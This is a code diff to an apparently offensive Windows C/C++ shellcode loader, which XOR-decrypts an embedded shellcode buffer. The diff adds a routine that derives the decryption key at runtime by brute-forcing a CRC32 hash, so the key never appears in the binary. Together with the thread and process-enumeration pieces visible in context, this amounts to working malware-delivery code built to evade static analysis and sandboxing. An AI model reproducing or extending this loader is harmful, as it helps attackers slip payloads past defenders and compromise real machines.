@@ -3,10 +3,10 @@
 //
 // Includes
 //
-#include <windows.h>
 #include <psapi.h>
 #include <stdio.h>
 #include <tlhelp32.h>
+#include <windows.h>
 #include <winhttp.h>
 
 //
@@ -26,6 +26,71 @@
 #define PRINT_DELIMITER()
 #define NEWLINE()
 #endif
+
+void ascii_to_hex( const char * ascii, unsigned char * hex, size_t hex_len ) {
+    size_t ascii_len = strlen( ascii );
+    for ( size_t i = 0; i < hex_len; i++ ) {
+        if ( i * 2 + 1 < ascii_len && isxdigit( ascii[i * 2] ) && isxdigit( ascii[i * 2 + 1] ) ) {
+            sscanf( &ascii[i * 2], "%2hhx", &hex[i] ); // Convert two characters at a time
+        } else {
+            hex[i] = 0;
+        }
+    }
+}
+
+constexpr unsigned int crc32h_impl( const char * message, unsigned int crc, unsigned int i ) {
+    return ( message[i] == '\0' )
+               ? ~crc
+               : crc32h_impl(
+                     message,
+                     ( ( crc ^ message[i] ) >> 8 ) ^
+                         ( ( ( crc ^ message[i] ) & 1 ? SEED : 0 ) ^
+                           ( ( crc ^ message[i] ) & 2 ? ( SEED >> 1 ) : 0 ) ^
+                           ( ( crc ^ message[i] ) & 4 ? ( SEED >> 2 ) : 0 ) ^
+                           ( ( crc ^ message[i] ) & 8 ? ( SEED >> 3 ) : 0 ) ^
+                           ( ( crc ^ message[i] ) & 16 ? ( SEED >> 4 ) : 0 ) ^
+                           ( ( crc ^ message[i] ) & 32 ? ( SEED >> 5 ) : 0 ) ^
+                           ( ( crc ^ message[i] ) & 64 ? ( ( SEED >> 6 ) ^ SEED ) : 0 ) ^
+                           ( ( crc ^ message[i] ) & 128 ? ( ( ( SEED >> 6 ) ^ SEED ) >> 1 ) : 0 ) ),
+                     i + 1
+                 );
+}
+
+constexpr unsigned int crc32h( const char * message ) {
+    return crc32h_impl( message, 0xFFFFFFFF, 0 );
+}
+
+unsigned char * Jesser( const char * known, size_t len, unsigned char * message, int depth, int currentDepth, unsigned int targetHash ) {
+    if ( currentDepth == depth ) {
+        message[len + currentDepth] = '\0';
+        if ( crc32h( ( const char * )message ) == targetHash ) {
+            unsigned char * result = ( unsigned char * )malloc( strlen( ( const char * )message ) + 1 );
+            strcpy( ( char * )result, ( const char * )message );
+            return result;
+        }
+        return NULL;
+    }
+
+    for ( char c = 33; c <= 126; ++c ) {
+        message[len + currentDepth] = c;
+        unsigned char * result      = Jesser( known, len, message, depth, currentDepth + 1, targetHash );
+        if ( result != NULL ) {
+            return result;
+        }
+    }
+
+    return NULL;
+}
+
+unsigned char * Jess( const char * known, size_t len, int depth, unsigned int targetHash ) {
+    //
+    // if you decide to use a key larger than 64 bytes, plz expect this to break
+    //
+    unsigned char message[64];
+    memset( message, 0, sizeof( message ) );
+    memcpy( message, known, len );
+    return Jesser( known, len, message, depth, 0, targetHash );
+}
 
 BOOL IsModuleLoaded(
     _In_ LPCSTR Module
@@ -163,6 +228,8 @@ BOOL XOR(
     _In_ PUCHAR Key,
     _In_ SIZE_T KeySize
 ) {
+    PRINT( "Xoring with key: %s", Key );
+    PRINT( "DataSize: %d, KeySize: %d", DataSize, KeySize );
     for ( SIZE_T i = 0; i < DataSize; i++ ) {
         BYTE temp = Key[i % KeySize];
         Data[i] ^= temp;
@@ -190,10 +257,29 @@ INT main( int argc, char ** argv ) {
         return 1;
     }
 
+    //
+    // derive key
+    //
+    // EXT const unsigned int targetHash = 0xdeadbeef;
+    // EXT const char known[] = { 0x41, 0x41, 0x41, 0x41 };
+    //
+    const size_t    key_size      = 8; // adjust as needed (note ascii vs binary)
+    const size_t    size_to_brute = 4;
+    unsigned char   key[key_size] = { 0 };
+    unsigned char * ascii_key     = { 0 };
+
+    if ( ( ascii_key = Jess( known, sizeof( known ), size_to_brute, targetHash ) ) == NULL ) {
+        PRINT_ERR( "Jess failed" );
+        return 1;
+    }
+
+    ascii_to_hex( ( const char * )ascii_key, key, key_size );
+    free( ascii_key );
+
     BOOL   WriteSuccess = { 0 };
     HANDLE Thread       = { 0 };
 
-    if ( ! XOR( Shellcode, SHELLCODE_SIZE, ( PUCHAR )&key, sizeof( key ) ) ) {
+    if ( ! XOR( Shellcode, SHELLCODE_SIZE, key, sizeof( key ) ) ) {
         PRINT_ERR( "XOR failed" );
         return 1;
     }
